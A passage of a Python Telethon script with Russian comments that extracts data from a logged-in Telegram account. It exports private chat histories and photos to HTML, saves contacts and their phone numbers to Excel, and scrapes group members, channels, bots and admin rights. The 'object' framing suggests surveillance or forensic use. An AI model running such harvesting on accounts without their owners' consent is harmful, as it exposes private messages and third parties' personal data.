import asyncio  
import os
import time
import openpyxl
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest, GetBlockedRequest
from telethon.tl.functions.messages import GetDialogsRequest, ImportChatInviteRequest
from telethon.tl.types import InputChannel, InputPhoneContact, User, Chat, Channel, Message, MessageFwdHeader, MessageMediaDocument, PeerChannel, DocumentAttributeFilename
from telethon.sync import TelegramClient, types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
from openpyxl import Workbook
from openpyxl.utils import get_column_letter
from datetime import datetime
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
from datetime import datetime
from typing import Optional
import re
from jinja2 import Template
import base64
from io import BytesIO
from PIL import Image
from html import escape
from telethon.sync import TelegramClient
from telethon import functions, types
from telethon.tl.functions.contacts import SearchRequest
from telethon.tl.functions.messages import SearchRequest as MessageSearchRequest
from telethon.tl.types import InputMessagesFilterEmpty
from datetime import datetime
from pytz import timezone
from html import escape
from jinja2 import Environment, FileSystemLoader


import base64
from io import BytesIO

def get_private_messages(client, target_user, selection):
    minsk_timezone = timezone('Europe/Minsk')

    # Информация об объекте
    me = client.get_me()
    userid_client = me.id
    firstname_client = me.first_name
    username_client = f"@{me.username}" if me.username is not None else ""
    lastname_client = me.last_name if me.last_name is not None else ""
    
    user = client.get_entity(target_user)
    # Информация о собеседнике
    username = f'@{user.username}' if user.username else ""
    first_name = user.first_name if user.first_name else ''
    last_name = user.last_name if user.last_name else ''
    user_id = user.id
   
    messages = []
    messages_count = 0
    first_message_date = None
    last_message_date = None
    try:
        for message in client.iter_messages(target_user):
            message_time = message.date.astimezone(minsk_timezone).strftime('%Y-%m-%d %H:%M:%S')
            
            if first_message_date is None or message.date < first_message_date:
                first_message_date = message.date

            if last_message_date is None or message.date > last_message_date:
                last_message_date = message.date
                
            if message.sender_id == userid_client:
                sender_info = f"{firstname_client}:"
            else:
                sender_info = f"{first_name}:"

            reply_text = None
            if message.reply_to_msg_id:
                original_message = client.get_messages(target_user, ids=message.reply_to_msg_id)
                reply_text = escape(original_message.text)

            reaction_info = ""
            reactions = message.reactions
            if reactions and reactions.recent_reactions:
                reaction_info = " ".join(reaction.reaction.emoticon for reaction in reactions.recent_reactions)

            media_type = None
            if message.media is not None:
                if isinstance(message.media, types.MessageMediaPhoto):
                    if selection == '45':
                        # Загрузка фото в формате base64
                        photo_bytes = client.download_media(message.media.photo, file=BytesIO())
                        if photo_bytes:
                            image = Image.open(photo_bytes)
                            

                            original_size = image.size
                            new_size = (original_size[0] // 2, original_size[1] // 2)
                            image = image.resize(new_size)

                            #image = image.resize((image.width // 2, image.height // 2))
                            output = BytesIO()
                            image.save(output, format='JPEG', quality=70)
                            encoded_image = base64.b64encode(output.getvalue()).decode('utf-8')
                            image_data_url = f"data:image/jpeg;base64,{encoded_image}"
                            media_type = f'<img src="{image_data_url}" alt="Photo">'

                        
                            #encoded_image = base64.b64encode(photo_bytes.getvalue()).decode('utf-8')
                            #image_data_url = f"data:image/jpeg;base64,{encoded_image}"
                            #media_type = f'<img src="{image_data_url}" alt="Photo">'
                        else:
                            media_type = 'Photo'
                    else:
                            media_type = 'Photo'
                elif isinstance(message.media, types.MessageMediaDocument):
                    for attribute in message.media.document.attributes:
                        if isinstance(attribute, types.DocumentAttributeFilename):
                            document_name = attribute.file_name
                            media_type = f"Document: {document_name}"
                            break
                    if media_type is None:
                        media_type = 'Document (Photo, video, etc)'
                elif isinstance(message.media, types.MessageMediaWebPage):
                    media_type = 'WebPage'
                elif isinstance(message.media, types.MessageMediaContact):
                    media_type = 'Contact'
                elif isinstance(message.media, types.MessageMediaGeo):
                    media_type = 'Geo'
                elif isinstance(message.media, types.MessageMediaVenue):
                    media_type = 'Venue'
                elif isinstance(message.media, types.MessageMediaGame):
                    media_type = 'Game'
                elif isinstance(message.media, types.MessageMediaInvoice):
                    media_type = 'Invoice'
                elif isinstance(message.media, types.MessageMediaPoll):
                    media_type = 'Poll'
                elif isinstance(message.media, types.MessageMediaDice):
                    media_type = 'Dice'
                elif isinstance(message.media, types.MessageMediaPhotoExternal):
                    media_type = 'PhotoExternal'
                else:
                    media_type = 'Unknown'
            
            messages_count +=1
            messages.append({
                'time': message_time,
                'sender_info': sender_info,
                'reply_text': reply_text,
                'text': escape(message.text),
                'reactions': reaction_info,
                'media_type': media_type,
                'sender_id': message.sender_id
            })
    except Exception as e:
        messages.append({
            'time': '',
            'sender_info': 'Ошибка',
            'reply_text': None,
            'text': f"Ошибка при получении переписки: {e}",
            'reactions': '',
            'media_type': '',
            'sender_id': None
        })

    env = Environment(loader=FileSystemLoader('.'))
    template = env.get_template('template_user_messages.html')
    html_output = template.render(
        firstname_client=firstname_client,
        first_name=first_name,
        messages=messages,
        userid_client=userid_client,
        user_id=user_id,
        first_message_date=first_message_date.astimezone(minsk_timezone).strftime('%d.%m.%Y'),
        last_message_date=last_message_date.astimezone(minsk_timezone).strftime('%d.%m.%Y'),
        messages_count=messages_count
    )
    
    filename = f"{target_user}_private_messages.html"
    with open(filename, "w", encoding="utf-8") as file:
        file.write(html_output)

    print(f"HTML-файл сохранен как '{filename}'")



    
# Получение информации о пользователе
def get_bot_from_search(client, phone, selection):
    bot_from_search = []
    bot_from_search_html = []
    try:
        keyword = 'bot'
        entities = client(SearchRequest(
            q=keyword,
            limit=1000  # Максимальное количество сущностей, которые нужно получить
        ))
        for user in entities.users:
            user_id = user.id
            first_name = user.first_name
            last_name = user.last_name
            username = user.username
            #print(f"User ID: {user_id}, First Name: {first_name}, Last Name: {last_name}, Username: {username}")
            if user.photo:
                user_info = client.get_entity(user.id)
                if user_info.photo:
                    photo_path = client.download_profile_photo(user, file=BytesIO())
                    if photo_path:
                        encoded_image = base64.b64encode(photo_path.getvalue()).decode('utf-8')
                        image_data_url = f"data:image/jpeg;base64,{encoded_image}"
                    else:
                        with open("no_image.png", "rb") as img_file:
                            img_data = img_file.read()
                            img_str = base64.b64encode(img_data).decode('utf-8')
                            image_data_url = f"data:image/png;base64,{img_str}"
                bot_from_search_html.append(
                        f'<img src="{image_data_url}" alt=" " style="width:50px;height:50px;vertical-align:middle;margin-right:10px;">'
                        f'<a href="https://t.me/{user.username}" style="color:#0000FF; text-decoration: none;vertical-align:middle;">@{user.username}</a> '
                        f'<span style="color:#556B2F;vertical-align:middle;">{user.first_name}</span>'
                )
                    
                bot_from_search.append(f"\033[93m'{user.first_name}'\033[0m, \033[36m@{user.username}\033[0m")
                
    except Exception as e:
        print(f"An error occurred: {e}")

    return bot_from_search, bot_from_search_html


def get_user_info(client, phone, selection):
    """Функция для получения информации о пользователе и его ID."""
    me = client.get_me()
    userid = me.id
    firstname = me.first_name
    username = f"@{me.username}" if me.username is not None else ""
    lastname = me.last_name if me.last_name is not None else ""
    userinfo = f"(Номер телефона: +{phone}, ID: {userid}, ({firstname} {lastname}) {username})"
    photos_user_html = ''
    print("Информация о пользователе:") 
    print()
    print(f"Номер телефона: {phone}")
    print(f"ID пользователя: {userid}")
    print(f"Имя пользователя: {firstname} {lastname}")
    print(f"Username пользователя: {username}")
    
    if selection == '0':        
        try:
            user_photo = client.get_profile_photos(userid)
            if user_photo:
                for i in range(len(user_photo)):
                    file_name = f"{phone}_{i}"
                    client.download_media(user_photo[i], file=file_name)
                    jpg_path = f"{file_name}.jpg"
                    mp4_path = f"{file_name}.mp4"
                    if os.path.exists(jpg_path):
                        with open(jpg_path, "rb") as img_file:
                            img_data = open(jpg_path, "rb").read()
                            img_str = base64.b64encode(img_data).decode('utf-8')
                            photos_user_html += f'<img src="data:image/jpeg;base64,{img_str}" alt="User photo {i+1}" style="width:100px;height:100px;vertical-align:middle;margin-right:10px;">'
                        os.remove(jpg_path)
                    elif os.path.exists(mp4_path):
                        with open(mp4_path, "rb") as video_file:
                            video_data = video_file.read()
                            video_str = base64.b64encode(video_data).decode('utf-8')
                            photos_user_html += f'<video width="100" height="100" controls><source src="data:video/mp4;base64,{video_str}" type="video/mp4">Your browser does not support the video tag.</video>'
                        os.remove(mp4_path)
            else:
                with open("no_image.png", "rb") as img_file:
                    img_data = img_file.read()
                    img_str = base64.b64encode(img_data).decode('utf-8')
                    image_data_url = f"data:image/png;base64,{img_str}"
                    photos_user_html +=f'<img src="data:image/png;base64,{img_str}" alt=" " style="width:100px;height:100px;vertical-align:middle;margin-right:10px;">'
        except Exception as e:
            print(f"An error occurred: {e}")

    return userid, userinfo, firstname,lastname, username, photos_user_html



# Получение и сохранение в Excel контактов пользователя
def get_and_save_contacts(client, phone_user, userid_user, userinfo, firstname_user, lastname_user, username_user):
    
    result = client(GetContactsRequest(0))
    contacts = result.users
    total_contacts = len(contacts)
    total_contacts_with_phone = sum(bool(getattr(contact, 'phone', None)) for contact in contacts)
    total_mutual_contacts = sum(bool(getattr(contact, 'mutual_contact', None)) for contact in contacts)
    print(f"Количество контактов: {total_contacts}")
    print(f"Количество контактов с номерами телефонов: {total_contacts_with_phone}")
    print(f"Количество взаимных контактов: {total_mutual_contacts}")
    print()
    
    # Сохраняем информацию о контактах
    contacts_file_name = f'{phone_user}_contacts.xlsx'
    print(f"Контакты сохранены в файл {phone_user}_contacts.xlsx")

    wb = openpyxl.Workbook()
    sheet = wb.active
    sheet.cell(row=1, column=1, value=userinfo)
    headers = ['ID контакта', 'First name контакта', 'Last name контакта', 'Username контакта', 'Телефон контакта', 'Взаимный контакт', 'Дата внесения в базу', 'First name объекта', 'Last name объекта', 'Username объекта', 'Телефон объекта', 'ID_объекта']
    for col, header in enumerate(headers, start=1):
        sheet.cell(row=2, column=col, value=header)
        
    row_num = 3
    for contact in contacts:
        if hasattr(contact, 'id'):
            sheet.cell(row=row_num, column=1, value=contact.id)
        if hasattr(contact, 'first_name'):
            sheet.cell(row=row_num, column=2, value=contact.first_name)
        if hasattr(contact, 'last_name'):
            sheet.cell(row=row_num, column=3, value=contact.last_name)
        if hasattr(contact, 'username') and contact.username is not None:
            username_with_at = f"@{contact.username}"
            sheet.cell(row=row_num, column=4, value=username_with_at)
        if hasattr(contact, 'phone'):
            sheet.cell(row=row_num, column=5, value=contact.phone)
        if hasattr(contact, 'mutual_contact') and contact.mutual_contact:
            sheet.cell(row=row_num, column=6, value='взаимный')
        sheet.cell(row=row_num, column=7, value=datetime.now().strftime('%d/%m/%Y %H:%M:%S'))
        sheet.cell(row=row_num, column=8, value=firstname_user)
        sheet.cell(row=row_num, column=9, value=lastname_user)
        sheet.cell(row=row_num, column=10, value=username_user)
        sheet.cell(row=row_num, column=11, value=phone_user)
        sheet.cell(row=row_num, column=12, value=userid_user)
     
        row_num += 1

    wb.save(contacts_file_name)
    return total_contacts, total_contacts_with_phone, total_mutual_contacts



# Выгружаем участников группы
def get_participants_and_save_xlsx(client, index: int, id: bool, name: bool, group_title, group_id, userid, userinfo):
    all_participants = client.get_participants(index)

    # Создание нового документа Excel
    wb = openpyxl.Workbook()
    sheet = wb.active
    sheet.cell(row=1, column=1, value=userinfo)
    sheet.cell(row=2, column=1, value=group_title)
  
    # Запись заголовков столбцов
    headers = ['ID', 'First Name', 'Last Name', 'Username', 'Записан в контакты', 'Взаимный контакт', 'Бот', 'ID группы','ID объекта']
    for col, header in enumerate(headers, start=1):
        sheet.cell(row=3, column=col, value=header)
    
    # Переменная для отслеживания строки
    row_num = 4
    
    # Процесс обработки участников чата в файл Excel
    for user in all_participants:
        # Если параметр id равен True, записываем ID пользователя без проверки
        if id:
            sheet.cell(row=row_num, column=1, value=user.id)
        
        # Если параметр name равен True и у пользователя есть имя, записываем его
        if name:
            if hasattr(user, 'first_name'):
                sheet.cell(row=row_num, column=2, value=user.first_name)
            if hasattr(user, 'last_name'):
                sheet.cell(row=row_num, column=3, value=user.last_name)
            if hasattr(user, 'username') and user.username is not None:
                usernamechat_with_at = f"@{user.username}"
                sheet.cell(row=row_num, column=4, value=usernamechat_with_at)
        if hasattr(user, 'contact') and user.contact:
            sheet.cell(row=row_num, column=5, value='Сохранен')
        if hasattr(user, 'mutual_contact') and user.mutual_contact:
            sheet.cell(row=row_num, column=6, value='Взаимный')
        if hasattr(user, 'bot') and user.bot:
            sheet.cell(row=row_num, column=7, value='Бот')
        sheet.cell(row=row_num, column=8, value=group_id)
        sheet.cell(row=row_num, column=9, value=userid)
        
        # Увеличиваем номер строки для следующего пользователя
        row_num += 1
    
    # Сохранение документа Excel
    def sanitize_filename(filename):
    # Удаляем недопустимые символы из имени файла
        return re.sub(r'[\\/*?:"<>|]', '', filename)
    
    clean_group_title = sanitize_filename(group_title)

    if clean_group_title == group_title:
        filename = f"{group_title}_participants.xlsx"
    else:
        filename = f"{clean_group_title}_participants.xlsx"

    wb.save(filename)

#Получаем сообщения пользователей
def get_user_dialogs(client):
    user_dialogs = []
    users_list = []
    dialogs = client.get_dialogs()
    i = 0
    
    for dialog in dialogs:
        if isinstance(dialog.entity, User) and not dialog.entity.bot:
            messages = client.get_messages(dialog.entity, limit=0)
            count_messages = messages.total
            
            user = dialog.entity
            username = f'\033[36m@{user.username}\033[0m' if user.username else ""
            first_name = user.first_name if user.first_name else ''
            last_name = user.last_name if user.last_name else ''
            
            user_dialogs.append(
                f'{i}) \033[95m{first_name} {last_name}\033[0m {username} {user.id} ' 
                f'/ \033[33m[{count_messages}]\033[0m'
            )

            users_list.append(dialog.entity.id)
            i += 1
    
    return user_dialogs, i, users_list

# Группируем каналы и чаты на открытые и закрытые, действующие боты        
def get_type_of_chats(client, selection):
    """Функция для подсчета количества сообщений в чатах и определения типов чатов."""
    chat_message_counts = {}
    openchannels = []
    closechannels = []
    openchats = []
    closechats = []
    count_messages = 0
    deactivated_chats = []
    all_chats_ids = []
    delgroups = []
    chats = client.get_dialogs()
    admin_id = [] 
    user_bots = []
    user_bots_html = []
    image_data_url = ''
    user_chat = []

    for chat in chats:   
        
        #Получаем данные о ботах
        if isinstance(chat.entity, User) and chat.entity.bot: 
            if selection == '0':
                try:
                    photo_bytes = client.download_profile_photo(chat.entity, file=BytesIO())
                    if photo_bytes:
                        encoded_image = base64.b64encode(photo_bytes.getvalue()).decode('utf-8')
                        image_data_url = f"data:image/jpeg;base64,{encoded_image}"
                    else:
                        with open("no_image.png", "rb") as img_file:
                            img_data = img_file.read()
                            img_str = base64.b64encode(img_data).decode('utf-8')
                            image_data_url = f"data:image/png;base64,{img_str}"
                except Exception:
                    pass
            user_bots_html.append(
                f'<img src="{image_data_url}" alt=" " style="width:50px;height:50px;vertical-align:middle;margin-right:10px;">'
                f'<a href="https://t.me/{chat.entity.username}" style="color:#0000FF; text-decoration: none;vertical-align:middle;">@{chat.entity.username}</a> '
                f'<span style="color:#556B2F;vertical-align:middle;">{chat.entity.first_name}</span>'
            )
            
            user_bots.append(f"\033[93m'{chat.entity.first_name}'\033[0m, \033[36m@{chat.entity.username}033[0m")
           
        # Работаем с групповыми чатами
        if isinstance(chat.entity, Channel) or isinstance(chat.entity, Chat):  
            # выгружаем количество сообщений при выборе опции выгрузить сообщение
            if selection == '7' or selection == '75': 
                messages = client.get_messages(chat.entity, limit=0)
                count_messages = messages.total
                chat_message_counts[chat.entity.id] = count_messages
        
            # Определяем открытый канал
            if isinstance(chat.entity, Channel) and hasattr(chat.entity, 'broadcast') and chat.entity.participants_count is not None:
                if chat.entity.broadcast and chat.entity.username:
                    if selection == '6':
                        if chat.entity.admin_rights or chat.entity.creator:
                            openchannels.append(chat.entity)
                            all_chats_ids.append(chat.entity.id)
                            admin_id.append(chat.entity.id)
                    
                    if selection != '6':
                        openchannels.append(chat.entity)
                        all_chats_ids.append(chat.entity.id)
                        if chat.entity.admin_rights or chat.entity.creator:
                            admin_id.append(chat.entity.id)

            # Определяем закрытый канал
            if isinstance(chat.entity, Channel) and hasattr(chat.entity, 'broadcast'):
                if chat.entity.broadcast and chat.entity.username is None and chat.entity.title != 'Unsupported Chat':
                    if selection == '6':
                        if chat.entity.admin_rights or chat.entity.creator:
                            closechannels.append(chat.entity)
                            all_chats_ids.append(chat.entity.id)
                            admin_id.append(chat.entity.id)
                    
                    if selection != '6':
                        closechannels.append(chat.entity)
                        all_chats_ids.append(chat.entity.id)
                        if chat.entity.admin_rights or chat.entity.creator:
                            admin_id.append(chat.entity.id)

            # Определяем открытый чат
            if isinstance(chat.entity, Channel) and hasattr(chat.entity, 'broadcast'):
                if not chat.entity.broadcast and chat.entity.username:
                    openchats.append(chat.entity)
                    all_chats_ids.append(chat.entity.id)
                    admin_id.append(chat.entity.id)

            # Определяем закрытый чат
            if isinstance(chat.entity, Channel) and hasattr(chat.entity, 'broadcast'):
               if chat.entity.broadcast == False and chat.entity.username == None:
                  closechats.append(chat.entity)
                  all_chats_ids.append(chat.entity.id)
                  admin_id.append(chat.entity.id)

            if isinstance(chat.entity, Chat) and chat.entity.migrated_to is None:
               closechats.append(chat.entity)
               all_chats_ids.append(chat.entity.id)
               admin_id.append(chat.entity.id)

                
            if selection == '5' or selection == '0': #Добавляем нулевые чаты только для общей информации
                if isinstance(chat.entity, Chat) and hasattr(chat.entity, 'participants_count') and chat.entity.participants_count == 0:
                   if chat.entity.migrated_to is not None and isinstance(chat.entity.migrated_to, InputChannel):
                      deactivated_chats_all = {
                         'ID_migrated': chat.entity.migrated_to.channel_id,
                         'ID': chat.entity.id,
                         'title': chat.entity.title,
                         'creator': chat.entity.creator,
                         'admin_rights': chat.entity.admin_rights,
                      }
                      deactivated_chats.append(deactivated_chats_all)
   
    if selection == '5' or selection == '0': #Добавляем нулевые чаты для общей информации
       if isinstance(chat.entity, Channel) or isinstance(chat.entity, Chat): # проверяем групповой ли чат
          for current_deleted_chat in deactivated_chats:
                 ID_migrated_values = current_deleted_chat['ID_migrated']
                 if ID_migrated_values not in all_chats_ids:
                      delgroups.append(current_deleted_chat)


    return delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, admin_id, user_bots, user_bots_html

# Функция для получения списка прав администратора в канале
def get_admin_rights_channel_list(admin_rights):
    rights = ['<span style="color:maroon; font-weight:bold; font-style:italic;">Права, как администратора канала:</span>']
    possible_rights = {
        'Изменение профиля канала': admin_rights.change_info if admin_rights else False,
        'Публикация сообщений': admin_rights.post_messages if admin_rights else False,
        'Изменение публикаций': admin_rights.edit_messages if admin_rights else False,
        'Удаление публикаций': admin_rights.delete_messages if admin_rights else False,
        'Публикация историй': admin_rights.post_stories if admin_rights else False,
        'Изменение историй': admin_rights.edit_stories if admin_rights else False,
        'Удаление историй': admin_rights.delete_stories if admin_rights else False,
        'Пригласительные ссылки': admin_rights.invite_users if admin_rights else False,
        'Управление трансляциями': admin_rights.manage_call if admin_rights else False,
        '<b>Назначение администраторов</b>': admin_rights.add_admins if admin_rights else False,
    }
    has_any_rights = any(possible_rights.values())
    for right, has_right in possible_rights.items():
        status = '<b><span style="color:red; font-weight:bold;">да</span></b>' if has_right else '<b>нет</b>'
        rights.append(f"{right} - {status}")
    return rights if has_any_rights else []

def get_admin_rights_chat_list(admin_rights):
    rights = ['<span style="color:maroon; font-weight:bold; font-style:italic;">Права, как администратора группы:</span>']
    possible_rights = {
        'Удаление сообщений': admin_rights.delete_messages if admin_rights else False,
        'Блокировка пользователей': admin_rights.ban_users if admin_rights else False,
        'Пригласительные ссылки': admin_rights.invite_users if admin_rights else False,
        'Закрепление сообщений': admin_rights.pin_messages if admin_rights else False,
        'Публикация историй': admin_rights.post_stories if admin_rights else False,
        'Изменение историй': admin_rights.edit_stories if admin_rights else False,
        'Удаление историй': admin_rights.delete_stories if admin_rights else False,
        'Управление трансляциями': admin_rights.manage_call if admin_rights else False,
        '<b>Назначение администраторов</b>': admin_rights.add_admins if admin_rights else False,
        'Анонимность': admin_rights.anonymous if admin_rights else False
    }
    has_any_rights = any(possible_rights.values())
    for right, has_right in possible_rights.items():
        status = '<b><span style="color:red; font-weight:bold;">да</span></b>' if has_right else '<b>нет</b>'
        rights.append(f"{right} - {status}")
    return rights if has_any_rights else []


# Формируем списки каналов и чатов
def make_list_of_channels(delgroups, chat_message_counts, openchannels, closechannels, openchats, closechats, selection, client):
    """Функция для формирования списков групп и каналов"""
    owner_openchannel = 0
    owner_opengroup = 0
    owner_closegroup = 0
    owner_closechannel = 0
    all_info = []
    groups = []
    i=0


    openchannels_name = 'Открытые КАНАЛЫ:' if openchannels else ''
    all_info.append(f"\033[95m{openchannels_name}\033[0m")  
    openchannel_count = 1  
    public_channels_html = []
    image_data_url = ''
    for openchannel in openchannels:
        if selection == '0':
            try:
                photo_bytes = client.download_profile_photo(openchannel, file=BytesIO())
                if photo_bytes:
                        encoded_image = base64.b64encode(photo_bytes.getvalue()).decode('utf-8')
                        image_data_url = f"data:image/jpeg;base64,{encoded_image}"
                else:
                    with open("no_image.png", "rb") as img_file:
                            img_data = img_file.read()
                            img_str = base64.b64encode(img_data).decode('utf-8')
                            image_data_url = f"data:image/png;base64,{img_str}"
            except Exception:
                pass 
        count_row = openchannel_count if selection == '5' or selection == '0' else i
        owner = " (Владелец)" if openchannel.creator else ""
        admin = " (Администратор)" if openchannel.admin_rights is not None else ""
        # Получение списка прав администратора
        admin_rights_list = get_admin_rights_channel_list(openchannel.admin_rights)
        admin_rights_html = ""
        if admin_rights_list:
            admin_rights_html = "<ul style='font-size:14px; font-style:italic;'>" + "".join([f"<li style='margin-left:50px;'>{right}</li>" for right in admin_rights_list]) + "</ul>"
        
        messages_count = f" / [{chat_message_counts.get(openchannel.id, 0)}]" if chat_message_counts else ""
        all_info.append(f"{count_row} - {openchannel.title} \033[93m[{openchannel.participants_count}]{messages_count}\033[0m\033[91m {owner} {admin}\033[0m ID:{openchannel.id} \033[94m@{openchannel.username}\033[0m")
        public_channels_html.append(
            f"{openchannel_count}. <img src='{image_data_url}' alt=' ' style='width:50px;height:50px;vertical-align:middle;margin-right:10px;'>" 
            f"<span style='color:#556B2F;'>{openchannel.title}</span> <span style='color:#8B4513;'>[{openchannel.participants_count}]</span> "
            f"<span style='color:#FF0000;'>{owner} {admin}</span> ID:{openchannel.id} "
            f'<a href="https://t.me/{openchannel.username}" style="color:#0000FF; text-decoration: none;">@{openchannel.username}</a>'
            f"{admin_rights_html}"
        )
        openchannel_count += 1
        groups.append(openchannel)
        i +=1
        if owner != "" or admin != "":
            owner_openchannel += 1

    closechannels_name = 'Закрытые КАНАЛЫ:' if closechannels else ''
    all_info.append(f"\033[95m{closechannels_name}\033[0m")  
    closechannel_count = 1
    private_channels_html = []
    image_data_url = ''
    for closechannel in closechannels:
        if selection == '0':
            try:
                photo_bytes = client.download_profile_photo(closechannel, file=BytesIO())
                if photo_bytes:
                        encoded_image = base64.b64encode(photo_bytes.getvalue()).decode('utf-8')
                        image_data_url = f"data:image/jpeg;base64,{encoded_image}"
                else:
                    with open("no_image.png", "rb") as img_file:
                            img_data = img_file.read()
                            img_str = base64.b64encode(img_data).decode('utf-8')
                            image_data_url = f"data:image/png;base64,{img_str}"
            except Exception:
                pass 
        count_row = closechannel_count if selection == '5' or selection == '0' else i
        owner = " (Владелец)" if closechannel.creator else ""
        admin = " (Администратор)" if closechannel.admin_rights is not None else ""
        
        # Получение списка прав администратора
        admin_rights_list = get_admin_rights_channel_list(closechannel.admin_rights)
        admin_rights_html = ""
        if admin_rights_list:
            admin_rights_html = "<ul style='font-size:14px; font-style:italic;'>" + "".join([f"<li style='margin-left:50px;'>{right}</li>" for right in admin_rights_list]) + "</ul>"
        
        messages_count = f" / [{chat_message_counts.get(closechannel.id, 0)}]" if chat_message_counts else ""
        all_info.append(f"{count_row} - {closechannel.title} \033[93m[{closechannel.participants_count}]{messages_count}\033[0m \033[91m{owner} {admin}\033[0m ID:{closechannel.id}")
        private_channels_html.append(
            f'{closechannel_count}. <img src="{image_data_url}" alt=" " style="width:50px;height:50px;vertical-align:middle;margin-right:10px;">'
            f"<span style='color:#556B2F;'>{closechannel.title}</span> <span style='color:#8B4513;'>[{closechannel.participants_count}]</span> <span style='color:#FF0000;'>{owner} {admin}</span> ID:{closechannel.id}"
            f"{admin_rights_html}"
        )
        closechannel_count += 1
        groups.append(closechannel)
        i +=1
        if owner != "" or admin != "":
            owner_closechannel += 1

    openchats_name = 'Открытые ГРУППЫ:' if openchats else ''
    all_info.append(f"\033[95m{openchats_name}\033[0m")
    opengroup_count = 1
    public_groups_html = []
    image_data_url = ''
    for openchat in openchats:
        if selection == '0':
            try:
                photo_bytes = client.download_profile_photo(openchat, file=BytesIO())
                if photo_bytes:
                        encoded_image = base64.b64encode(photo_bytes.getvalue()).decode('utf-8')
                        image_data_url = f"data:image/jpeg;base64,{encoded_image}"
                else:
                    with open("no_image.png", "rb") as img_file:
                            img_data = img_file.read()
                            img_str = base64.b64encode(img_data).decode('utf-8')
                            image_data_url = f"data:image/png;base64,{img_str}"
            except Exception:
                pass 
        count_row = opengroup_count if selection == '5' or selection == '0' else i
        owner = " (Владелец)" if openchat.creator else ""
        admin = " (Администратор)" if openchat.admin_rights is not None else ""
        admin_rights_list = get_admin_rights_chat_list(openchat.admin_rights)
        admin_rights_html = ""
        if admin_rights_list:
            admin_rights_html = "<ul style='font-size:14px; font-style:italic;'>" + "".join([f"<li style='margin-left:50px;'>{right}</li>" for right in admin_rights_list]) + "</ul>"
        
        messages_count = f" / [{chat_message_counts.get(openchat.id, 0)}]" if chat_message_counts else ""
        all_info.append(f"{count_row} - {openchat.title} \033[93m[{openchat.participants_count}]{messages_count}\033[0m\033[91m {owner} {admin}\033[0m ID:{openchat.id} \033[94m@{openchat.username}\033[0m")
        public_groups_html.append(
            f'{opengroup_count}. <img src="{image_data_url}" alt=" " style="width:50px;height:50px;vertical-align:middle;margin-right:10px;">'
            f"<span style='color:#556B2F;'>{openchat.title}</span> <span style='color:#8B4513;'>[{openchat.participants_count}]</span> "
            f"<span style='color:#FF0000;'>{owner} {admin}</span> ID:{openchat.id} "
            f'<a href="https://t.me/{openchat.username}" style="color:#0000FF; text-decoration: none;">@{openchat.username}</a>'
            f"{admin_rights_html}"
        )
        opengroup_count += 1
        groups.append(openchat)
        i +=1
        if owner != "" or admin != "":
            owner_opengroup += 1

    closechats_name = 'Закрытые ГРУППЫ:' if closechats else ''
    all_info.append(f"\033[95m{closechats_name}\033[0m")
    closegroup_count = 1
    private_groups_html = []
    image_data_url = ''
    for closechat in closechats:
        if selection == '0':
            try:
                photo_bytes = client.download_profile_photo(closechat, file=BytesIO())
                if photo_bytes:
                        encoded_image = base64.b64encode(photo_bytes.getvalue()).decode('utf-8')
                        image_data_url = f"data:image/jpeg;base64,{encoded_image}"
                else:
                    with open("no_image.png", "rb") as img_file:
                            img_data = img_file.read()
                            img_str = base64.b64encode(img_data).decode('utf-8')
                            image_data_url = f"data:image/png;base64,{img_str}"
            except Exception:
                pass 
        count_row = closegroup_count if selection == '5' or selection == '0' else i
        owner = " (Владелец)" if closechat.creator else ""
        admin = " (Администратор)" if closechat.admin_rights is not None else ""
        admin_rights_list = get_admin_rights_chat_list(closechat.admin_rights)
        admin_rights_html = ""
        if admin_rights_list:
            admin_rights_html = "<ul style='font-size:14px; font-style:italic;'>" + "".join([f"<li style='margin-left:50px;'>{right}</li>" for right in admin_rights_list]) + "</ul>"
        
        messages_count = f" / [{chat_message_counts.get(closechat.id, 0)}]" if chat_message_counts else ""
        all_info.append(f"{count_row} - {closechat.title} \033[93m[{closechat.participants_count}]{messages_count}\033[0m \033[91m{owner} {admin}\033[0m ID:{closechat.id}")
        #private_groups_html.append(f"{closegroup_count} - <span style='color:#556B2F;'>{closechat.title}</span> <span style='color:#8B4513;'>[{closechat.participants_count}]</span> <span style='color:#FF0000;'>{owner} {admin}</span> ID:{closechat.id}")
        private_groups_html.append(
            f'{closegroup_count}. <img src="{image_data_url}" alt=" " style="width:50px;height:50px;vertical-align:middle;margin-right:10px;">'
            f"<span style='color:#556B2F;'>{closechat.title}</span> <span style='color:#8B4513;'>[{closechat.participants_count}]</span> <span style='color:#FF0000;'>{owner} {admin}</span> ID:{closechat.id}"
            f"{admin_rights_html}"
        )
        closegroup_count += 1
        groups.append(closechat)
        i +=1
        if owner != "" or admin != "":
            owner_closegroup += 1

    
    delgroups_name = 'Удаленные ГРУППЫ:' if delgroups else ''
    all_info.append(f"\033[95m{delgroups_name}\033[0m")
    closegroupdel_count = 1
    deleted_groups_html = []
    for delgroup in delgroups:
        count_row = closegroupdel_count if selection == '5' or selection == '0' else i
        owner_value = delgroup['creator']
        admin_value = delgroup['admin_rights']
        id_value = delgroup['ID']
        title_value = delgroup['title']
        owner = " (Владелец)" if owner_value else ""
        admin = " (Администратор)" if admin_value is not None else ""
        all_info.append(f"{count_row} - {title_value} \033[91m{owner} {admin}\033[0m ID:{id_value}")
        deleted_groups_html.append(f"{closegroupdel_count} - <span style='color:#556B2F;'>{title_value}</span> <span style='color:#FF0000;'>{owner} {admin}</span> ID:{id_value}")
        closegroupdel_count += 1
        i +=1
        if owner != "" or admin != "":
            owner_closegroup += 1

    return groups, i, all_info, openchannel_count, closechannel_count, opengroup_count, closegroup_count, closegroupdel_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, public_channels_html, private_channels_html, public_groups_html, private_groups_html, deleted_groups_html


#Запись информации о группах в файл
def save_about_channels(phone, userid, firstname, lastname, username, openchannel_count, opengroup_count, closechannel_count, closegroup_count, owner_openchannel, owner_closechannel, owner_opengroup, owner_closegroup, openchannels, closechannels, openchats, closechats, delgroups, closegroupdel_count):
    
    def write_data(sheet, data):
        sheet.append(["Название", "Количество участников", "Владелец", "Администратор", "ID", "Ссылка"])
        for item in data:
          owner = " (Владелец)" if item.creator else ""
          admin = " (Администратор)" if item.admin_rights is not None else ""
          usernameadd = f"@{item.username}" if hasattr(item, 'username') and item.username is not None else ""
